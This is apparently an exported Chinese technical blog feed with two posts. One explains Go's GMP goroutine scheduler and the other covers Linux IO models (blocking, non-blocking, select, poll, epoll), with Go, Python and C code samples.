<p>Go 语言的调度器通过使用与 CPU 数量相等的线程减少线程频繁切换的内存开销，同时在每一个线程上执行额外开销更低的 Goroutine 来降低操作系统和硬件的负载。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>调度器的三个组成部分：G(Goroutine)，P(处理器)，M(线程)</p>
<ul>
<li>G：代表 Goroutine，是一个待执行的任务</li>
<li>P：代表处理器，相当于一个与线程绑定的小型调度器</li>
<li>M：代表操作系统线程</li>
</ul>
<p><img src="https://i.loli.net/2020/04/26/F617HYhRtfTrJlM.png" alt="GMP模型"></p>
<h3 id="G"><a href="#G" class="headerlink" title="G"></a>G</h3><p>Gorotuine 就是 Go 语言调度器中待执行的任务，它在运行时调度器中的地位与线程在操作系统中差不多，但是它占用了更小的内存空间，也降低了上下文切换的开销。</p>
<p>Goroutine 只存在于 Go 语言的运行时，它是 Go 语言在用户态提供的线程，作为一种粒度更细的资源调度单元，如果使用得当能够在高并发的场景下更高效地利用机器的 CPU。</p>
<p>Goroutine 表现为私有结构体 g，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> g <span class="keyword">struct</span> &#123;</span><br><span class="line">    stack stack <span class="comment">// 栈内存范围</span></span><br><span class="line">    preempt <span class="keyword">bool</span> <span class="comment">// 抢占信号</span></span><br><span class="line">    _panic *_panic <span class="comment">// 存储 panic 结构体的链表</span></span><br><span class="line">    _defer *_defer <span class="comment">// 存储 defer 结构体的链表</span></span><br><span class="line">    m *m <span class="comment">// 当前占用线程</span></span><br><span class="line">    sched gobuf <span class="comment">// 与 Goroutine 调度相关的数据</span></span><br><span class="line">    atomicstatus <span class="keyword">uint32</span> <span class="comment">// Goroutine 的状态</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sched</code> 字段对 Goroutine 的调度至关重要：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> gobuf <span class="keyword">struct</span> &#123;</span><br><span class="line">    sp <span class="keyword">uintptr</span> <span class="comment">// 栈指针</span></span><br><span class="line">    pc <span class="keyword">uintptr</span> <span class="comment">// 程序计数器</span></span><br><span class="line">    g guintptr <span class="comment">// 持有这个 gobuf 的 Goroutine</span></span><br><span class="line">    ret sys.Uintreg <span class="comment">// 系统调用的返回值</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Goroutine 的状态可分为三类：等待中、可运行、运行中</p>
<ul>
<li>等待中：Goroutine 正在等待某些条件满足，例如：系统调用结束等，包括 <code>_Gwaiting</code>、<code>_Gsyscall</code> 和 <code>_Gpreempted</code> 几个状态</li>
<li>运行时：Goroutine 已经准备就绪，可以在线程运行，如果当前程序中有非常多的 Goroutine，每个 Goroutine 就可能会等待更多的时间，即 <code>_Grunnable</code></li>
<li>运行中：Goroutine 正在某个线程上运行，即 <code>_Grunning</code></li>
</ul>
<!-- ![Goroutine状态](https://i.loli.net/2020/04/26/HYZyCRmugW4XA8K.png) -->

<h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><p>M 是操作系统线程。调度器最多可以创建 10000 个线程，但是其中大多数的线程都不会执行用户代码（可能陷入系统调用），最多只会有 GOMAXPROCS 个活跃线程能够正常运行。在默认情况下，运行时会将 GOMAXPROCS 设置成当前机器的核数，这样不会触发操作系统的线程调度和上下文切换，所有的调度都会发生在用户态，由 Go 语言调度器触发，能够减少非常多的额外开销。我们也可以使用 runtime.GOMAXPROCS 来改变程序中最大的线程数。</p>
<p><img src="https://i.loli.net/2020/04/26/ihSrwOGqjRa3mCo.png" alt="M与CPU"></p>
<p>线程表现为私有结构体 m，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> m <span class="keyword">struct</span> &#123;</span><br><span class="line">    g0 *g <span class="comment">// 持有调度栈的 goroutine，深度参与 goroutine 的创建过程</span></span><br><span class="line">    curg *g <span class="comment">// 当前线程持有的 goroutine</span></span><br><span class="line">    p puintptr <span class="comment">// 正在运行的调度器</span></span><br><span class="line">    nextp puintptr <span class="comment">// 备用调度器</span></span><br><span class="line">    oldp puintptr <span class="comment">// 之前使用的调度器</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>通过处理器 P 的调度，每一个内核线程都能够执行多个 Goroutine，它能在 Goroutine 进行一些 I/O 操作时及时切换，提高线程的利用率。</p>
<p>调度器在启动时就会创建 GOMAXPROCS 个处理器，即处理器数量一定会等于 GOMAXPROCS，这些处理器会绑定到不同的内核线程上并利用线程的计算资源运行 Goroutine。</p>
<p>处理器表现为私有结构体 p，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> p <span class="keyword">struct</span> &#123;</span><br><span class="line">    status <span class="keyword">uint32</span> <span class="comment">// 处理器状态</span></span><br><span class="line">    m muintptr <span class="comment">// 当前绑定的线程</span></span><br><span class="line">    runqhead <span class="keyword">uint32</span> <span class="comment">// 等待队列队头</span></span><br><span class="line">    runqtail <span class="keyword">uint32</span> <span class="comment">// 等待队列队尾</span></span><br><span class="line">    runq [<span class="number">256</span>]guintptr <span class="comment">// 等待队列</span></span><br><span class="line">    runnext guintptr <span class="comment">// 下一个需要执行的 goroutine</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/26/TaxLscAnwlDZq7m.png" alt="GMP三者关系"></p>
<h2 id="创建-Goroutine"><a href="#创建-Goroutine" class="headerlink" title="创建 Goroutine"></a>创建 Goroutine</h2><p><code>go</code> 关键字会被转换为 <code>runtime.newproc</code>，该函数会接收大小和表示函数的指针:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newproc</span><span class="params">(siz <span class="keyword">int32</span>, fn *funcval)</span></span> &#123;</span><br><span class="line">    argp := add(unsafe.Pointer(&amp;fn), sys.PtrSize)</span><br><span class="line">    gp := getg()</span><br><span class="line">    pc := getcallerpc()</span><br><span class="line">    newproc1(fn, (*<span class="keyword">uint8</span>)(argp), siz, gp, pc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>runtime.newproc1</code> 根据入参初始化一个 <code>g</code>，该函数的行为可分为：</p>
<ol>
<li>获取或者创建新的 Goroutine 结构体：从处理器的 <code>gFree</code> 列表得到一个空闲的 g。如果获取失败则创建一个新的 g</li>
<li>将传入的参数移到 Goroutine 的栈上：将 fn 的参数全部压栈</li>
<li>更新 Goroutine 调度相关的属性：设置新 g 的 sp、pc并更新其状态到 <code>_Grunnable</code></li>
<li>将 Goroutine 加入运行队列 runq：Go 语言中有两个运行队列，一个是处理器本地的运行队列，另一个是调度器持有的全局运行队列，只有在本地运行队列没有剩余空间时才会使用全局队列<br><img src="https://i.loli.net/2020/04/27/1bVMsIOvXk3Dlx7.png" alt="运行队列"></li>
</ol>
<h2 id="触发调度"><a href="#触发调度" class="headerlink" title="触发调度"></a>触发调度</h2><ul>
<li><p>主动挂起：当 goroutine 陷入休眠（如 <code>time.sleep</code>）或阻塞在一次 chan 操作时，goroutine 触发主动挂起。主动挂起会将当前 goroutine 暂停。调度器把 goroutine 状态设为 <code>_Gwaiting</code> 并<strong>解除 goroutine 与线程的绑定</strong>（相当于让出线程，随后就可以执行一次 goroutine 调度），等待状态的 goroutine 不占用线程。当主动挂起的 goroutine 满足特定条件后，运行时将其状态设为 <code>_Grunnable</code> 并放到运行队列等待调度。</p>
</li>
<li><p>系统调用：当 goroutine 阻塞在一次 IO 或其它系统调用上调度器会更新 goroutine 状态为 <code>_Gsyscall</code> 并<strong>解除线程和处理器的绑定</strong>（相当于让出处理器，这样处理器就可以绑定到其它线程上。原线程陷入系统调用等待返回。这个过程触发一次线程切换的系统调用）。系统调用结束后，为这个 goroutine 重新分配资源并更新其状态为 <code>_Grunnable</code>，找到一个可用的处理器与这个 goroutine 绑定。</p>
</li>
</ul>
<p>下面这段代码示范了运行时在主动挂起和系统调用时进行协程调度：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line">improt (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line">    sched := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">    loopCount := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-sched:</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    loopCount += <span class="number">1</span></span><br><span class="line">                    fmt.Printf(<span class="string">&quot;loop %d\n&quot;</span>, loopCount) <span class="comment">// Printf 属于 IO，可能会阻塞然后触发调度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sched &lt;-<span class="keyword">struct</span>&#123;&#125;&#123;&#125; <span class="comment">// 主动阻塞在一次 channel 操作上，触发调度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反复执行这段程序会发现输出结果不唯一，因为 <code>fmt.Printf</code> 操作具体什么时候阻塞是说不准的。但只要有 loop 被打印出来，可以肯定发生了两次调度：一次由 chan 发送操作导致，一次由 IO 操作导致。</p>
<h2 id="设计原理"><a href="#设计原理" class="headerlink" title="设计原理"></a>设计原理</h2><p>总结起来三个特点：多线程、任务窃取、抢占式：</p>
<ol>
<li>多线程：进程中可以同时存在多个活跃线程。多线程调度器引入了 GOMAXPROCS 变量帮助我们灵活控制程序中的最大处理器数，即活跃线程数</li>
<li>任务窃取：进行 goroutine 调度时，调度器会先从当前处理器或全局待运行队列中获得一个 goroutine；如果获取失败，则从其它处理器的待运行队列中随机获取 goroutine</li>
<li>抢占式：STW 和栈扫描时会触发抢占。当前 goroutine 被设为 _Gpreempted，调度器进行一次 goroutine 调度</li>
</ol>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>网络IO</title>
    <url>/2020/04/17/%E7%BD%91%E7%BB%9CIO/</url>
    <content><![CDATA[<p>计算机之间可以通信，本质上也是计算机进程相互通信。为了方便不同终端进行通信，网络协议栈抽象出socket层，通过对socket文件描述符的操作来进行网络IO。当然，不同的应用场景，衍生出了不同的网络模型</p>
<span id="more"></span>

<h2 id="一次网络响应"><a href="#一次网络响应" class="headerlink" title="一次网络响应"></a>一次网络响应</h2><p>互联网应用中，多数架构是 CS 模式，即 client 发出请求，server 接受请求，处理之后返回响应。这样的一次交互，伴随着 client 和 server 的 IO 操作。</p>
<p>一次简单的交互，往往涉及网络 IO 和磁盘文件 IO。大致流程如图：</p>
<p><img src="https://i.loli.net/2020/04/17/jMxUNO7ltuwgRTX.png" alt="一次IO"></p>
<p>对 Server 而言，处理响应的过程如下：</p>
<ol>
<li>Server 的进程发起 Read 系统调用，内核随即从硬件 Disk 读取数据到内核缓冲区（kernel buf）</li>
<li>内核把 kernel buf 的数据 copy 到应用程序进程的缓冲区，应用程序就可以对数据进行修改。</li>
<li>应用进程将数据通过系统调用 Send 发送到 socket 缓冲区，每个 socket 文件都在内核维护了一个发送/接受缓冲区。</li>
<li>最后再把 socket 发送缓冲区的数据 copy 到 NIC 网卡中，通过协议栈发送到Client 的网卡。</li>
</ol>
<p>所谓的IO，就是将硬件（磁盘、网卡）的数据读取到程序的内存中。</p>
<p>因为应用程序很少可以直接和硬件交互，因此操作系统作为两者的桥梁。通常操作系统在对接两端（应用程序与硬件）时，自身有一个内核 buf，用于数据的 copy 中转。</p>
<p><img src="https://i.loli.net/2020/04/17/lJoTNEzbcdejuFt.png" alt="硬件、内核、应用"></p>
<p>一般网络 IO 分为两个阶段：</p>
<ol>
<li>等待数据阶段。数据通过协议栈发送到网卡，网卡再通过 DMA copy 到 kernel buf</li>
<li>拷贝数据阶段。将 kernel buf 的数据 copy 到 app buf 中。</li>
</ol>
<h2 id="Linux-5-种-IO-模型"><a href="#Linux-5-种-IO-模型" class="headerlink" title="Linux 5 种 IO 模型"></a>Linux 5 种 IO 模型</h2><h3 id="阻塞-IO"><a href="#阻塞-IO" class="headerlink" title="阻塞 IO"></a>阻塞 IO</h3><p>所谓阻塞 IO 指在网络 IO 的两个阶段进程都会阻塞。</p>
<p><img src="https://i.loli.net/2020/04/17/WoMVpI9X72KzcGN.png" alt="阻塞IO"></p>
<p>进程对象发起 Recv 操作，这是一个系统调用，然后内核会看 kernel buf 是否有数据，如果没有数据，那么进程将会被挂起，直到 kernek buf 从硬件或者网络读取到数据之后，内核再把数据从 kernel buf copy 到 app buf中，然后唤醒发起调用的进程，并且 Recv 操作将会返回数据。接下来进行可以对进程 buf 的数据进行处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">address = (<span class="string">&#x27;&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sock.accept() <span class="comment"># 进程会阻塞直至有数据返回</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; connect&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>) <span class="comment"># 进程会阻塞直至有数据返回</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; closed&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;data is &#x27;</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>

<h3 id="非阻塞-IO"><a href="#非阻塞-IO" class="headerlink" title="非阻塞 IO"></a>非阻塞 IO</h3><p>当进程把一个文件描述符设置成非阻塞时，执行 read 和 write 等 I/O 操作就会立刻返回。在 C 语言中，我们可以使用如下所示的代码片段将一个文件描述符设置成非阻塞的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> flags = fcntl(fd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">fcntl(fd, F_SETFL, flags | O_NONBLOCK);</span><br></pre></td></tr></table></figure>

<p>如果没有数据，发起的 IO 系统调用会马上返回一个 <code>EWOULDBLOCK</code> 错误。函数返回之后，进程没有被挂起，可以继续做别的。</p>
<p><img src="https://i.loli.net/2020/04/17/6yAJMt5CG4dRj2Z.png" alt="非阻塞IO"></p>
<p>进程获得了 EWOULDBLOCK 之后会再次发起非阻塞 IO 请求，这个过程还是会使用 CPU，因此也称之为轮询（polling）。然而此时应用程序可以对读取操作系统缓冲区中的数据并进行操作。换言之进程使用非阻塞 I/O 时可以在等待过程中执行其他的任务。</p>
<p>内核有数据的时候，内核将 kernel buf 的数据 copy 到 app buf 的过程还是需要 cpu 参与，对于非阻塞 IO 来说，这个过程仍然是阻塞的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"></span><br><span class="line">address = (<span class="string">&#x27;&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.setblocking(<span class="literal">False</span>) <span class="comment"># 将 socket 设置为非阻塞的</span></span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 获得 EWOULDBLOCK 错误，轮询</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn, addr = sock.accept()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; connect&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">    conn.setblocking(<span class="literal">False</span>) <span class="comment"># 将 socket 设置为非阻塞的</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 轮询</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; closed&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;data is &#x27;</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>

<h3 id="多路复用-IO"><a href="#多路复用-IO" class="headerlink" title="多路复用 IO"></a>多路复用 IO</h3><p>阻塞 IO 会让线程挂起。非阻塞 IO 需要一直做 polling，每一次 polling 都会做系统调用，某种程度下，非阻塞 IO 的性能将还不如阻塞 IO。既然需要内核频繁操作，那么就有人想出了新的模型：让内核代理去做轮询，然后应用进程只有数据准备了再发起 IO 操作不就好了吗？</p>
<p>多路复用 IO 就是这样的原理，所谓“多路复用”是指一个线程复用多个 socket。由内核负责监控应用指定的 socket 文件描述符，socket 准备好（可读，可写，异常等）时，通知应用进程。“准备好”是一个事件，当事件发生，通知应用进程，而应用进程可以执行事先注册的对应该事件的回调函数。有大量事件发生的前提下，多用复用 IO 可以极大提高服务器并发性能。</p>
<blockquote>
<p>多路复用 IO = 多路监听 + 阻塞/非阻塞 IO。多路监听指的是下文的 select/poll/epoll 等监听系统，这些系统监听的 socket 则负责 IO。</p>
</blockquote>
<h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>select 系统调用提供一个机制来实现同步 IO：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> n, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, struct timeval* timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/30/fMzL5wP7vETWpC6.png" alt="select模型g"></p>
<p>调用 select 将导致阻塞直到指定的文件描述符准备好执行 IO，或者可选参数 timeout 指定的时间已经过去。</p>
<p>select 成功返回时，返回值是 ready 状态的 fd 数目。每组 set 都被修改以使它只包含准备好 IO 的文件描述符。</p>
<p>例如，假设有两个 fd 分别是 7 和 9 被放在 readfds。select 返回后，应用进程需要遍历 readfds，判断其中每一个 fd 的状态，如果 7 发生读事件而 9 没有，那么对 7 读不会阻塞，对 9 读可能阻塞（”可能”是因为数据或许正好在 select 返回后就可用，这种情况下，下一次调用 select 将返回 9）。</p>
<p><strong>因为 fd_set 是静态创建的，它们对 fd 的最大数目强加了一个限制，能够放进 set 中的 fd 的数量由在 32 位机默认是 1024，64位机默认是2048。</strong></p>
<p>缺点：</p>
<ol>
<li>单进程可以打开 fd 有限制；</li>
<li>对得到的 fd_set 进行线性扫描，即采用轮询的方法，效率较低；</li>
<li>包含大量 fd 的数组在用户态和内核态的地址空间反复复制，而不论这些文件描述符是否就绪，它的开销随着文件描述符数量的增加而线性增大。</li>
</ol>
<h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><p>poll 的机制与 select 类似，与 select 在本质上没有多大差别，管理多个描述符也是进行轮询，也需要反复在用户态和内核态之间复制结构体，但是 poll 采用链表的方式替换原有 fd_set，使其<strong>没有连接数的限制</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd* fds, <span class="keyword">unsigned</span> <span class="keyword">int</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> fd;             <span class="comment">/* 文件描述符 */</span></span><br><span class="line"><span class="keyword">short</span> events;       <span class="comment">/* 期望的事件 */</span></span><br><span class="line"><span class="keyword">short</span> revents;      <span class="comment">/* 实际发生的事件 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每一个 pollfd 指定一个被监视的 fd。传递一个 pollfd 链表指示 poll 监视多个 fd。每个结构体的 events 域是监视该文件描述符的事件掩码，由用户来设置这个域。revents 域是文件描述符的操作结果事件掩码，内核在调用返回时设置这个域。</p>
<h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><p>设想一下如下场景：有 100 万个客户端同时与一个服务器进程保持着 TCP 连接。而每一时刻，通常只有几百上千个 TCP 连接是活跃的(事实上大部分场景都是这种情况)。如何实现这样的高并发？</p>
<p>在 select/poll 时代，服务器进程每次都把这 100 万个连接告诉操作系统(从用户态复制句柄数据结构到内核态)，让操作系统内核去查询这些套接字上是否有事件发生，轮询完后，再将句柄数据复制到用户态，让服务器应用程序轮询处理已发生的网络事件，这一过程资源消耗较大，因此，select/poll 一般只能处理几千的并发连接。</p>
<p>epoll 是是之前的 select/poll 的增强版本。相比 select/poll，epoll 更加灵活，没有描述符限制。epoll 使用一个文件描述符管理多个描述符，将用户关系的文件描述符的事件存放到内核的一个事件表中，这样在用户空间和内核空间的 copy 只需一次。</p>
<p>epoll 提供三个接口：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="comment">// 创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* epoll的事件注册函数，注册要监听的事件类型。</span></span><br><span class="line"><span class="comment">第一个参数是 epoll_create()的返回值；</span></span><br><span class="line"><span class="comment">第二个参数表示动作，用三个宏来表示：EPOLL_CTL_ADD，EPOLL_CTL_MOD，EPOLL_CTL_DEL；</span></span><br><span class="line"><span class="comment">第三个参数是需要监听的 fd；</span></span><br><span class="line"><span class="comment">第四个参数是告诉内核需要监听什么事 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, struct epoll_event* event)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd, struct epoll_event* events, <span class="keyword">int</span> maxevents, <span class="keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p>第一步：epoll_create 系统调用。此调用返回一个句柄，之后所有的使用都依靠这个句柄来标识。</p>
<p>第二步：epoll_ctl 系统调用。通过此调用向 epoll 对象中添加、删除、修改感兴趣的事件，返回 0 表示成功，返回 -1 表示失败。</p>
<p>第三部：epoll_wait 系统调用。通过此调用收集收集在 epoll 监控中已经发生的事件。</p>
<p><strong>下面来看看 epoll 是怎么实现的：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> &#123;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">/*红黑树的根节点，这颗树中存储着所有添加到epoll中的需要监控的事件*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span>  <span class="title">rbr</span>;</span></span><br><span class="line">    <span class="comment">/*双链表中则存放着将要通过epoll_wait返回给用户的满足条件的事件*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rdlist</span>;</span></span><br><span class="line">    ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每次调用 epoll_create 方法，内核创建一个 eventpoll 结构体，用于存放通过 epoll_ctl 方法向epoll对象中添加进来的事件。这些事件都会挂载在红黑树中，如此，重复添加的事件就可以通过红黑树而高效的识别出来。</p>
<p>所有添加到 epoll 中的事件都会与设备(网卡等)建立回调关系。也就是说，当相应的事件发生时会调用这个回调方法。这个回调方法在内核中叫 ep_poll_callback，它会将发生的事件添加到 rdlist 双链表中。</p>
<p>每一个事件都会创建一个对应的 epitem 结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>  <span class="title">rbn</span>;</span><span class="comment">//红黑树节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">rdllink</span>;</span><span class="comment">//双向链表节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_filefd</span>  <span class="title">ffd</span>;</span>  <span class="comment">//事件句柄信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span>    <span class="comment">//指向其所属的eventpoll对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span> <span class="comment">//期待发生的事件类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用 epoll_wait 检查是否有事件发生时，只需要检查 eventpoll 对象中的 rdlist 双链表中是否有 epitem 元素即可。如果 rdlist 不为空，则把发生的事件复制到用户态，同时将事件数量返回给用户:</p>
<p><img src="https://i.loli.net/2020/04/24/ZVMg1j5dHoRU6Bf.png" alt="Epoll实现"></p>
<p>优点：</p>
<ol>
<li>支持一个进程持有大数目的 fd。epoll 底层用红黑树管理 fd，所支持的 fd 上限是最大可以打开文件的数目。</li>
<li>IO 效率不随 fd 数目增加而线性下降。举个例子：传统的 select/poll 另一个致命弱点就是当你拥有一个很大的 socket 集合，任一时间只有部分 socket 处于 ready 状态。但是 select/poll 每次调用返回后都要线性扫描全部的 socket、检查所有 socket 的状态，导致效率呈现线性下降。epoll 不存在这个问题，它只会对 ready socket 进行操作。</li>
<li>epoll 对每个 fd 只会进行一次用户态到内核态的复制。</li>
</ol>
<h2 id="水平触发与边缘触发"><a href="#水平触发与边缘触发" class="headerlink" title="水平触发与边缘触发"></a>水平触发与边缘触发</h2><ul>
<li>水平触发（Level Triggered, LT）：只要文件描述符关联的读内核缓冲区非空，有数据可以读取，就一直发出可读信号进行通知，当文件描述符关联的内核写缓冲区不满，有空间可以写入，就一直发出可写信号进行通知。LT 同时支持阻塞 IO 与非阻塞 IO。在这种模式下，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的 fd 进行 IO 操作。如果你不作任何操作，内核还是会继续通知你的，所以，这种模式编程出错误可能性要小一点。<strong>传统的 select/poll 都是采用这种模式，epoll 默认也是这种模式</strong>。</li>
